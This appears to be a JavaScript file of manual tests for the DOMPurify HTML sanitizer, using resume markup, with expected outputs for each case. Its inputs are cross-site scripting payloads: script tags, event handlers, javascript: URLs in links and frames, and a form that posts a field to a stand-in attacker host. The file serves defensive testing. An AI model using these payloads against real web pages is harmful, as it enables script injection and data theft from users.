/**
 * DOMPurify manual test examples.
 *
 * These examples are intended for a JavaScript environment where DOMPurify has
 * already been imported. In source or tests, use:
 *
 * import DOMPurify from "dompurify";
 */

// Example 1: normal resume HTML should preserve safe formatting.
const normalResume = `
  <h1 class="name">Jordan Lee</h1>
  <div class="contact">jordan@example.com - (555) 123-4567 - Chicago, IL</div>
  <hr class="section-divider">
  <h2>SUMMARY</h2>
  <p>Experienced program coordinator with 5+ years in client services.</p>
`;

console.log("Normal HTML:", DOMPurify.sanitize(normalResume));
// Expected: same safe formatting preserved.

// Example 2: script tags should be blocked.
const xssScript = `
  <h1 class="name">Jordan Lee</h1>
  <script>alert("XSS Attack!");</script>
  <p>Legitimate content</p>
`;

console.log("XSS Script:", DOMPurify.sanitize(xssScript));
// Expected: <h1 class="name">Jordan Lee</h1><p>Legitimate content</p>

// Example 3: event handlers should be blocked.
const xssEvent = `
  <h1 onclick="alert('XSS')" onmouseover="stealData()">Click me</h1>
  <img src="x" onerror="alert('XSS')">
`;

console.log("XSS Event:", DOMPurify.sanitize(xssEvent));
// Expected: <h1>Click me</h1><img src="x">

// Example 4: JavaScript URLs and dangerous frames should be blocked.
const xssUrl = `
  <a href="javascript:alert('XSS')">Click here</a>
  <iframe src="javascript:alert('XSS')"></iframe>
`;

console.log("XSS URL:", DOMPurify.sanitize(xssUrl));
// Expected: <a>Click here</a>

// Example 5: safe inline styles should remain.
const styledResume = `
  <h1 style="color: #333; font-size: 24px;">Jordan Lee</h1>
  <p style="margin-bottom: 10px;">Program Coordinator</p>
`;

console.log("Styled HTML:", DOMPurify.sanitize(styledResume));
// Expected: safe CSS preserved.

// Example 6: complex dangerous content should be stripped.
const complexXss = `
  <div>
    <h1>Jordan Lee</h1>
    <style>body { background: url('javascript:alert(1)'); }</style>
    <link rel="stylesheet" href="javascript:alert(1)">
    <object data="javascript:alert(1)"></object>
    <embed src="javascript:alert(1)">
    <form action="https://evil.example/steal">
      <input name="data" value="sensitive">
    </form>
  </div>
`;

console.log("Complex XSS:", DOMPurify.sanitize(complexXss));
// Expected: only safe content remains.

// Optional stricter configuration for future sensitive render contexts.
const customConfig = {
  ALLOWED_TAGS: ["h1", "h2", "h3", "p", "div", "span", "ul", "li", "strong", "em"],
  ALLOWED_ATTR: ["class", "id", "style"],
  ALLOWED_STYLES: {
    "*": {
      color: [/^#[0-9a-f]{3,6}$/i],
      "font-size": [/^\d+px$/],
      margin: [/^\d+px$/],
      padding: [/^\d+px$/],
    },
  },
};

const restrictedHtml = '<h1 class="name">John</h1><script>alert(1)</script>';
console.log("Restricted:", DOMPurify.sanitize(restrictedHtml, customConfig));
